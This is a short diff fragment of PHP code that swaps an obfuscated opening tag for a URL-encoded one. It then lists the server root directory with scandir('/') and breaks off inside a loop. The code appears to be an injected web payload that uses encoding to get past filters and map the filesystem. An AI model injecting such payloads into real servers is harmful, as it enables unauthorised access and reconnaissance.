@@ -1,4 +1,4 @@
-<<--><?--><?
+%3C%3F
 $files = scandir('/');
 $f = array();
 foreach($files as $file){
